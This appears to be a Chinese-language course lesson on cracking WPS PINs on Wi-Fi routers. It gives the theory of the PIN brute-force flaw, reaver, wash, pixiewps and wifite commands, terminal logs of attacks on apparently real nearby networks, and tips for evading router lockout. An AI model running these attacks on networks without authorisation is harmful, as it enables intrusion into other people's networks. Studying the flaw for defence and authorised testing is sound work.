@@ -1,0 +1,192 @@
+课时65 WPS
+
+╋━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╋
+┃WPS (WIRELESS PROTECTED SETUP)                            ┃
+┃WPS是WiFi联盟2006年开放的一项技术                         ┃
+┃    通过PIN码来简化无线接入的操作，无需记住PSK            ┃
+┃    路由器和网卡各按一个按钮就能接入无线                  ┃
+┃    PIN码是分为前后各4位的2段共8位数字                    ┃
+┃安全漏洞                                                  ┃
+┃    2011年被发现安全涉及漏洞                              ┃
+┃    接入发起方可以根据路由器的返回信息判断前4位是否正确   ┃
+┃    而PIN码的后4位只有1000中定义的组合(最后一位是checksum)┃
+┃    所以全部穷举破解只需要11000次尝试
+┃        PSK: 218,340,105,584,896                          ┃
+┃    标准本身没有设计锁定机制，目前多个厂商已实现锁定机制  ┃
+╋━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╋
+
+╋━━━━━━━━━━━━━━━━━━━━━━━━━━╋
+┃WPS (WIRELESS PROTECTED SETUP)                      ┃
+┃包括Linksys在内的很多厂家的无线路由器无法关闭WPS功能┃
+┃即使在WEB节目中有关闭WPS，配置也不会生效            ┃
+┃攻击难度相对较低，防御却十分困难                    ┃
+┃一般可在4-10小时爆破密码                            ┃
+┃    PSK                                             ┃
+┃用计算器直接算出PIN                                 ┃
+┃    C83A35                                          ┃
+┃    00B00C                                          ┃
+╋━━━━━━━━━━━━━━━━━━━━━━━━━━╋
+
+╋━━━━━━━━━━━━━━━━━━━━━━━╋
+┃WPS (WIRELESS PROTECTED SETUP)                ┃ 
+┃启动侦听模式后，发现支持WPS的AP               ┃
+┃    wash -C -i wlan0mon                       ┃
+┃    airodump-ng wlan0mon --wps                ┃
+┃爆破PIN码                                     ┃
+┃    reaver -i wlan0mon -b <AP mac> -vv        ┃
+┃秒破PIN码                                     ┃
+┃    reaver -i wlan0mon -b <AP mac> -vv -K 1   ┃
+┃    pixiewps                                  ┃
+┃    只适用于固定厂商的芯片，成功率很低        ┃
+┃reaver -i wlan0mon -b <AP mac> -vv -p 88888888┃
+╋━━━━━━━━━━━━━━━━━━━━━━━╋
+
+
+root@kali:~# wash -C -i wlan0mon
+
+Wash v1.5.2 WiFi Protected Setup Scan Tool
+Copyright (c) 2011, Tactical Network Solutions, Craig Heffner <cheffner@tacnetsol.com>
+mod by t6_x <t6_x@hotmail.com> & DataHead & Soxrok2212
+
+BSSID                  Channel       RSSI       WPS Version        WPS Locked       ESSID
+------------------------------------------------------------------------------------------------
+00:C7:C0:99:ED:3A       1            -71        1.0                No               ziroom222
+5C:63:BF:F9:74:0C       1            -81        1.0                No               TP-D03234
+14:75:90:21:4F:56      11            -57        1.0                No               TP-LINK_4F56
+BC:D1:77:C0:87:DE      11            -57        1.0                No               MERCURY_C087DE
+
+root@kali:~# airodump-ng wlan0mon --wps
+CH 1 ][ Elapsed: 6 s ][ 2015-11-11 21:32
+
+BSSID               PwR  Beacons   #Data, #/s  CH  MB   ENC  CIPHER AUTH WPS    ESSID
+
+EC:26:CA:DC:29:B6  -27         6       0    0  11  54e. WPA2 CCMP   PSK         kifi
+14:75:90:21:4F:56  -52         5       0    0  11  54e. WPA2 CCMP   PSK   1.0   TP-LINK_4F56
+08:10:79:2A:29:7A  -64         6       0    0   6  54e  WPA2 CCMP   PSK         2-1-403
+D0:C7:C0;99:ED:3A  -73         4       0    0   1  54e. WPS2 CCMP   PSK   1.0   ziroom222
+E0:06:E6:39:C3:0C  -79         6       0    0  11  54e. WPA2 CCMP   PSK         lizhi2012
+5C:63:BF:F9:74:0C  -78         6       0    0   1  54e. WPS2 CCMP   PSK   1.0   TP-D03234
+
+BSSID              STATION             PWR  Rate   Lost     Frames  Probe
+
+(not associated)   74:E5:0B:31:F4:D4   -50   0 - 1      0        3   TP_LINK_4F56
+(not associated)   54:9F:13:73:02:8D   -80   0 - 1      0        1   TP_LINK_4F56
+
+root@kali:~# reaver -i wlan0mon -b 14:75:90:21:4F:56 -vv -c 11
+
+Reaver v1.5.2 WiFi Protected Setup Attack Tool
+Copyright (c) 2011, Tactical Network Solutions, Craig Heffner <cheffner@tacnetsol.com>
+mod by t6_x <t6_x@hotmail.com> & DataHead & Soxrok2212
+
+[+] Switching wlan0mon to channel 11
+[?] Restore previous session for 14:75:90:21:4F:56? [n/Y]
+[+] p1_index set to 5053
+[+] p2_index set to 423
+[+] Restored previous session
+[+] Waiting for beacon from 14:75:90:21:4F:56
+^C
+[+] Session saved.
+
+root@kali:~# ifconfig wlan0mon down
+
+root@kali:~# ifconfig wlan0mon up
+
+root@kali:~# reaver -i wlan0mon -b 14:75:90:21:4F:56 -vv -c 11
+
+Reaver v1.5.2 WiFi Protected Setup Attack Tool
+Copyright (c) 2011, Tactical Network Solutions, Craig Heffner <cheffner@tacnetsol.com>
+mod by t6_x <t6_x@hotmail.com> & DataHead & Soxrok2212
+
+[+] Switching wlan0mon to channel 11
+[?] Restore previous session for 14:75:90:21:4F:56? [n/Y]
+[+] Waiting for beacon from 14:75:90:21:4F:56 
+[+] Associated with 14:75:90:21:4F:56 (ESSID: TP_LINK_4F56)
+[+] Starting Cracking Session.Pin count:0, Max pin attempts: 11000
+[+] Trying pin 12345670
+[+] Sending EAPOL START request
+[+] WARNING: Receive timeout occurred
+[+] Sending EAPOL START request
+[+] WARNING: Receive timeout occurred
+[+] Sending EAPOL START request
+[+] WARNING: Receive timeout occurred
+[+] Sending EAPOL START request
+[+] WARNING: Receive timeout occurred
+[+] Sending EAPOL START request
+[+] WARNING: Receive timeout occurred
+[+] Sending EAPOL START request
+[+] WARNING: Receive timeout occurred
+
+root@kali:~# service network-manager stop
+
+root@kali:~# airmon-ng check kill
+Killing these processes:
+
+  PID Name
+  765 dhclient
+  988 wpa_supplicant
+
+root@kali:~# airmon-ng start wlan0mon
+No interfering processes found
+PHY     Interface       Driver               Chipset
+
+phy0    wlan0           rt2800usb            Ralink Technology, Corp. RT5370
+                 (mac80211 monitor mode vif enable for [phy0]wlan0 on [phy0]wlan0mon)
+                 (mac80211 station mode vif disabled for [phy0]wlan0)
+
+root@kali:~# wash -i wlan0mon -C
+
+Wash v1.5.2 WiFi Protected Setup Scan Tool
+Copyright (c) 2011, Tactical Network Solutions, Craig Heffner <cheffner@tacnetsol.com>
+mod by t6_x <t6_x@hotmail.com> & DataHead & Soxrok2212
+
+BSSID                  Channel       RSSI       WPS Version        WPS Locked       ESSID
+------------------------------------------------------------------------------------------------
+00:C7:C0:99:ED:3A       1            -71        1.0                No               ziroom222
+5C:63:BF:F9:74:0C       1            -81        1.0                No               TP-D03234
+
+root@kali:~# reaver -i wlan0mon -b 00:C7:C0:99:ED:3A -vv -K 1
+
+╋━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╋
+┃WPS (WIRELESS PROTECTED SETUP)                              ┃
+┃问题：                                                      ┃
+┃    很多厂家实现了锁定机制，所以爆破时应注意限速            ┃
+┃    一旦触发锁定，可尝试耗尽AP连接数，令其重启并解除WPS锁定 ┃
+┃                                                            ┃
+┃                                                            ┃
+┃                                                            ┃
+┃综合自动化无线密码破解工具wifite                            ┃
+╋━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╋
+
+root@kali:~# wifite
+
+  .;'                     `;,    
+ .;'  ,;'             `;,  `;,   WiFite v2 (r87)
+.;'  ,;'  ,;'     `;,  `;,  `;,  
+::   ::   :   ( )   :   ::   ::  automated wireless auditor
+':.  ':.  ':. /_\ ,:'  ,:'  ,:'  
+ ':.  ':.    /___\    ,:'  ,:'   designed for Linux
+  ':.       /_____\      ,:'     
+           /       \             
+
+
+ [+] scanning for wireless devices...
+[0:00:00] scanning wireless network. 0 targets and 0 clients found
+
+NUM ESSID                 CH  ENCR  POWER  WPS?  CLIENT
+------------------------  --  ----  -----  ----  ------
+1 kif                     11  WPA2  70db    no   client
+2 TP_LINK_4F56            11  WPA2  48db   wps   client
+3 2-1-403                  6  WPA2  35db    no
+4 ziroom222                1  WPA2  28db   wps   client
+5 lizhi2012               11  WPA2  22db    no
+6 TP-D03234                1  WPA2  39db   wps
+7 MERCURY_C087DE          11  WPA2  16db   wps
+
+[+] select target numbers (1-7) separated by commas, or 'all': 4
+
+[+] 1 target selected.
+
+[0:00:00] initializing WPS Pixie attack no airoom222 (D0:C7:C0:99:ED:3A)
+[0:00:00] WPS Pixie attack: Sending EAPOL START request
+
+
